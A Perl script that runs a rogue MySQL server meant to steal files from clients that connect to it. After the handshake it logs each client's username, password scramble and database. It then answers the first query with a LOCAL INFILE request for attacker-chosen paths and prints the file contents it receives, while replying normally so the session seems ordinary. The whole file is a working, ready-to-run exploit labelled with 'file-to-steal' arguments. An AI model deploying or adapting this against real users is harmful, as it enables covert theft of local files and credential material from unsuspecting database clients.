#!/usr/bin/perl

my $port = '23306';
my $database = 'myecho';
my $table = 'mytable';
my $field = 'myfield';

use strict;
use Socket;
use FindBin qw($Bin);
use IO::Socket::INET;

BEGIN {
	unshift @INC, $Bin;
};

use DBIx::MyServer;

my @files_to_steal = @ARGV;
die "Usage: $0 file-to-steal1.txt file-to-steal2.txt ..." if(!scalar @files_to_steal);

my %remaining_files_to_steal;

my $server_sock = IO::Socket::INET->new(Listen => 5, LocalPort => $port, ReuseAddr => 1) or die ("Cant listen: $!");

show_info(undef, "Please use `mysql --host=127.0.0.1 --port=$port` to connect.");

while (my $remote_socket = $server_sock->accept()) {

   $remote_socket->autoflush(1);    # Always a good idea 

   my $myserver = DBIx::MyServer->new( socket => $remote_socket );

   $myserver->sendServerHello();	# Those three together are identical to
   my ($username, $database) = $myserver->readClientHello();	#	$myserver->handshake()
   my $scrambled_password = unpack("H*", $myserver->[DBIx::MyServer::MYSERVER_SCRAMBLE]);
   my $peerhost = $remote_socket->peerhost;
   my $uniq_client_id = "$peerhost-$username-$database";
   show_info($uniq_client_id, sprintf("Username: %s, Scramble: %s, Database: %s", $username, $scrambled_password, $database));
   $myserver->sendOK();		# which uses the default authorize() handler

   if(!defined($remaining_files_to_steal{$uniq_client_id})) {
	   my @tmp_copy = @files_to_steal;
	   $remaining_files_to_steal{$uniq_client_id} = \@tmp_copy;
   }
   my $file_to_steal = shift @{$remaining_files_to_steal{$uniq_client_id}};

   my $pid;
   if (not defined ($pid = fork()))
   {
     sleep 1;
	 next;
   }
   
   if ($pid)
   {
	   # server
       close $remote_socket;        # Only meaningful in the client 
	   next;
   }

   # client
   $remote_socket->autoflush(1);    # Always a good idea 
   close $server_sock;

   while (1) {
		my ($command, $data) = $myserver->readCommand();
		show_info($uniq_client_id, "Command: $command; Data: $data");
		if (
			(not defined $command) ||
			($command == DBIx::MyServer::COM_QUIT)
		) {
			show_info($uniq_client_id, "Exiting.");
			last;
		} elsif ($command == DBIx::MyServer::COM_QUERY) {
					
			# we need to wait for the for the first query command, otherwise the client might abort the TCP connection 
			# we can steal only one file at once
			if ($file_to_steal) {
			  send_file_upload_request($myserver, $file_to_steal);
			  my $content = receive_file_upload($myserver);
			  show_info($uniq_client_id, sprintf("%s (%d bytes)\n%s\n", $file_to_steal, length($content), $content));
			  # and emulating a connection lost		  
			  # last;
			}
			
			$myserver->sendDefinitions([$myserver->newDefinition( name => 'field' )]);
			if ($data eq 'select @@version_comment limit 1') {
				$myserver->sendRows([[$0]]);	# Output script name
			} else {
				
				$myserver->sendRows([[$data]]);
			}
			
		} else {
			$myserver->sendErrorUnsupported($command);
		}
   }
}

sub verify_file_path_lengths {
	my @paths = shift;
	for my $p (@paths) {
		die "Error: $p is too long. Max length is 255 bytes." if(length($p) > 255)
	}
}
sub receive_file_upload {
	my $myserver = shift;
	
	my $data = $myserver->_readPacket();
	# printf "%d %s\n", length($data), unpack("H*", $data);
	
	# there is one more header (?) at the end of this response, which seems to be 00 00 00 03 always. Lets read it
	my $r = sysread($myserver->[DBIx::MyServer::MYSERVER_SOCKET], my $header, 4);
	die "upload trailer not received" if($r != 4);
	# print "Suffix: $r\n";
	return $data;
}
sub send_file_upload_request {
	my $myserver = shift;
	my $path = shift;
	
	my $data;
	
	$data .= chr(length($path)+1);
	$data .= "\0"; 
	$data .= "\0"; 
	$data .= chr(1);
	$data .= chr(0xfb);
	$data .= $path;

	my $send_result = $myserver->_writeData($data);	
}

sub show_info {
	my $uniq_id = shift;
	my $msg = shift;
	printf("[%s %s %s] %s\n", localtime()."", "$$", $uniq_id, $msg);
}
